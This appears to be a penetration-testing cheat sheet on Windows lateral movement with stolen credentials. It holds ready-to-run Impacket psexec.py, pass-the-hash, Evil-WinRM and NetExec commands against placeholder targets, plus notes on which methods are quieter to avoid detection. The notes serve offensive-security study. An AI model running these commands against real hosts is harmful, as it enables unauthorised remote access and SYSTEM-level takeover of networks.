Remote execution is a lateral movement technique that uses legitimate Windows administration protocols to execute commands on another host using stolen credentials.

## Requirements

Most methods require **Local Administrator** privileges on the target.

**WinRM** is the exception:
- `BUILTIN\Administrators`
- `BUILTIN\Remote Management Users`
    
---

## PsExec

**PsExec** uses SMB to upload and execute a service on the target.

### How it works
```text
SMB (445)
   ↓
ADMIN$ share → Upload executable
   ↓
Service Control Manager
   ↓
Create & start service
   ↓
SYSTEM shell
```

Impacket:
```bash
python3 psexec.py DOMAIN/user:'password'@TARGET
```

Check admin access first:
```bash
nxc smb TARGET -u user -p 'password' -d DOMAIN
```

`(Pwn3d!)` → confirms local admin access.

**With NTLM hash (Pass-the-Hash):**
```bash
python3 psexec.py 'DOMAIN/Administrator@<TARGET_IP>' \
  -hashes 'LM_HASH:NTLM_HASH'
```

### Important

PsExec gives:
```cmd
whoami
nt authority\system
```

It is **noisy** because it:
- Writes a file to `ADMIN$`
- Creates a service
- Generates service-related events

---

## Evil-WinRM

**WinRM** provides remote PowerShell access over:
```text
5985 → HTTP
5986 → HTTPS
```

Connect:
```bash
evil-winrm -i TARGET_IP -u user -p 'password'
```

Pass-the-Hash:
```bash
evil-winrm -i TARGET -u Administrator -H NTLM_HASH
```

### Important
Unlike PsExec:

```cmd
whoami
DOMAIN\user
```

The shell runs as the **authenticated user**, not SYSTEM.

Evil-WinRM also supports:
- File upload/download
- In-memory script loading
- DLL injection

WinRM is generally **quieter than PsExec** because it doesn't upload a service binary or create a service.

---

## Other Remote Execution Methods

| Method  | Tool          | Main mechanism        |
| ------- | ------------- | --------------------- |
| PsExec  | `psexec.py`   | SMB + Service         |
| WMI     | `wmiexec.py`  | WMI                   |
| DCOM    | `dcomexec.py` | DCOM                  |
| SMBExec | `smbexec.py`  | SMB + Service         |
| AtExec  | `atexec.py`   | Scheduled Task        |
| WinRM   | `evil-winrm`  | PowerShell Remoting   |
| RDP     | `xfreerdp3`   | GUI session           |
| NetExec | `nxc`         | SMB command execution |

Most Impacket tools support:
```text
Password
NTLM hash
Kerberos ticket
```

---

## NetExec Command Execution

Quick command execution:
```bash
nxc smb TARGET -u user -p 'password' -d DOMAIN -x 'whoami'
```

PowerShell:
```bash
nxc smb TARGET -u user -p 'password' -d DOMAIN -X '$PSVersionTable'
```

Useful when you need **one-off commands** rather than an interactive shell.

---

### Quick Decision

```text
Local Admin?
   │
   ├── Yes → PsExec / WMI / SMBExec / DCOM
   │
   └── No
        │
        └── Remote Management Users?
               │
               └── Yes → Evil-WinRM
```

**Core idea:**  
`PsExec → SYSTEM + noisy`  
`Evil-WinRM → User context + quieter`  
`WMI/DCOM/SMBExec/AtExec → alternatives when a specific method is blocked or unsuitable.`